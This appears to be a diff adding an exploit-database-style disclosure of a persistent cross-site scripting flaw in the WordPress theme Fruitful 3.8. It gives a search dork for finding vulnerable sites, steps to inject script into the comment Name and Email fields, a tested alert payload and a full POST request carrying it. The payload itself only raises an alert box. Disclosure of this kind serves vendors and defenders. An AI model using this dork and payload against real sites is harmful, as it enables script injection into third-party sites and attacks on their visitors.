@@ -1,0 +1,25 @@
+# Exploit Title: WordPress Theme Fruitful 3.8 - Persistent Cross-Site Scripting
+# Dork: intext:"Fruitful theme by fruitfulcode Powered by: WordPress" intext:"Comment" intext:"Leave a Reply"
+# Date: 2020-02-14
+# Category : Webapps
+# Software Link: https://downloads.wordpress.org/theme/fruitful.3.8.zip
+# Vendor Homepage: https://github.com/Fruitfulcode/Fruitful
+# Exploit Author: Ultra Security Team (Ashkan Moghaddas , AmirMohammad Safari)
+# Team Members: Behzad Khalifeh , Milad Ranjbar
+# Version: 3.8
+# Tested on: Windows/Linux
+# CVE: N/A
+
+.:: Theme Description ::.
+Fruitful is Free WordPress responsive theme with powerful theme options panel and simple clean front end design.
+
+.:: Proof Of Concept (PoC) ::.
+Step 1 - Find Your Target With above Dork.
+Step 2 - Inject Your Java Script Codes to Name & Email Fields
+Step 3 - Click Post Comment
+
+.:: Tested Payload ::.
+'>"><script>alert(/XSS By UltraSecurity/)</script>
+
+.:: Post Request ::.
+comment=XSS :)&author='>"><script>alert(/Xssed By Ultra Security/)</script>&email='>"><script>alert(/Xssed By Ultra Security/)</script>&url=UltraSec.org&submit=Post Comment&comment_post_ID=1&comment_parent=0&akismet_comment_nonce=9cd073a8bd&ak_js=1581431825145
